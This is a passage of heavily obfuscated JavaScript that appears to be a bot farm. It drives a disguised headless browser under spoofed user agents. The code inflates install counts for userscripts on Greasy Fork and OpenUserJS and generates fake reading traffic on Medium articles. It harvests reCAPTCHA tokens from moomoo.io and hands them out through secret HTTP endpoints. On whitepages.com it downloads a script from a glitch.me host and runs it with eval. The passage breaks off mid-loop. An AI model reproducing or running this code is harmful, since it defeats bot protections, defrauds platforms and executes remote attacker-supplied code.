      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + Z(0x1c) + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + Y(0x1, 'NXS2') + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + Z(0x19) + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + Z(0x8)
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + X(0x14) + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    Z(0x1e) + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + Y(0x1a, 'a@Il') + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x1 * 0x571 + -0x2077 + -0x1b06 * -0x1
  };

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x191b * 0x1 + 0x23f8 + -0x3d13);
    let h = e[f];
    if (b['MWYDAs'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x149b + -0x1384 + -0x1 * -0x281f, s, t, u = 0x133d + 0xf68 + -0x22a5; t = n['charAt'](u++); ~t && (s = r % (0x1 * -0x65d + 0x253d + -0x1edc) ? s * (-0x13c4 + 0x1 * -0x1402 + -0x2 * -0x1403) + t : t, r++ % (-0xe62 + -0x5 * 0x42b + 0x233d)) ? p += String['fromCharCode'](-0xa7 * 0x3b + -0x2 * -0xd69 + -0x2 * -0x655 & s >> (-(0x7 * -0x33b + -0x1606 + 0x2ca5) * r & 0x11 * 0x10f + -0x5eb + 0x607 * -0x2)) : -0xf75 + 0x5d1 * 0x3 + -0x1fe) {
          t = o['indexOf'](t);
        }
        for (let v = 0x23d8 * 0x1 + 0x1f9 + -0x25d1, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0xd3 * -0x26 + 0x11eb + -0x312d))['slice'](-(0x2e * -0x32 + 0x2107 + -0x1809));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x132a + 0x1a59 + -0x2d83,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x192f + 0x2 * -0xba2 + 0x3073; u < -0x1 * 0x1304 + 0x3 * 0x599 + 0x339; u++) {
          p[u] = u;
        }
        for (u = 0x2c1 * -0x4 + -0x1425 + 0x1f29; u < 0x3 * 0x60c + 0x2 * -0x673 + 0x2 * -0x21f; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x231e + -0x1e64 + -0x3ba), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x4dd + -0x2a * 0x35 + 0xd8f, q = -0x3 * -0x204 + 0x1 * 0x10f0 + -0x1 * 0x16fc;
        for (let v = -0x1 * 0x4df + 0x26db + -0x64 * 0x57; v < n['length']; v++) {
          u = (u + (-0x168f + 0x765 + 0xf2b)) % (0x3d * -0x45 + -0x1c07 + 0x4 * 0xb5e), q = (q + p[u]) % (-0x1 * 0x61 + 0x140e + 0x7 * -0x2ab), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x11f5 * -0x1 + -0x467 * -0x1 + 0xe8e)]);
        }
        return t;
      };
      b['hJanox'] = m, c = arguments, b['MWYDAs'] = !![];
    }
    const j = e[0xb50 + 0x1d9 + 0x1 * -0xd29],
      k = f + j,
      l = c[k];
    return !l ? (b['xUqqqG'] === undefined && (b['xUqqqG'] = !![]), h = b['hJanox'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const a0 = c;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x47a * -0x7 + 0x1271 + 0x1 * 0xce5)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x5b6 * 0x1 + 0x15 * 0x9d + -0x611 * 0x3), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x145 + -0x1b55 + 0x1a74), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x1f56 + 0x5b6 * -0x1 + 0x1 * 0x250c;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x516 + 0x4 * 0x86 + 0x1 * 0x2fe; w < getRandomInt(0xd * -0x95 + 0x1a77 + -0x12e5, 0x8c3 * -0x4 + -0xa9b + -0x2 * -0x16d6); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x50d7 + 0x1715d + -0x3626);
        }
      }();
    }, -0x1db6 + -0x1 * 0xfd4 + 0x2dee), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x64b + 0x1dfd + -0x2448 * 0x1;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x5a1 * 0x1 + 0x893 + -0x71a * 0x2, 0xb07 + 0x12c7 * 0x1 + -0x1d9c)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0xb849 + 0xd102 + 0x5c77);
    }, 0x12fd * 0x1 + -0x11ca + -0xcf * 0x1), doFlags['doWhitepag' + a0(0xc)] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x27d + -0x1b5e + 0x1ddb;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x1fc0 + -0x185 * 0xc + -0x1eda * -0x2), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x2 * 0xff + -0x35 * -0xa3 + -0x23bd), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x217f0 * -0x8 + 0xcead0 + -0xfeeb0);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x66 * -0x2b + -0xcaf * 0x1 + -0x40f * 0x1);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x7 * 0x48f + -0x2128 + 0x751 * 0x9);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x109a + -0xcfd * -0x2 + 0x1630);
}
doFlags['doOUJS'] && ((async () => {
  const a3 = c,
    a2 = d;
  async function f() {
    const a1 = d,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x1 * 0x285 + 0xffa + -0x127e) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x17d3 + 0x4 * 0x4b9 + -0x2ab6));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x219f + 0x123 * 0x1 + -0x22c2, D['indexOf']('\x20'));
        return B ? E['slice'](-0x1de5 + -0x1bd * 0x3 + 0x231c, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x5 * -0xaf + 0x239f + 0x6),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0xf1e + 0x4cf1 + -0x16c3),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + a1(0x12) + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + a2(0x1b) + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + a2(0x5) + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + a3(0x18) + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x61 * 0x63 + -0x13ee * -0x1 + -0x3971; k < -0x22f + -0x1e5 * 0xb + 0x1 * 0x170a; k++)
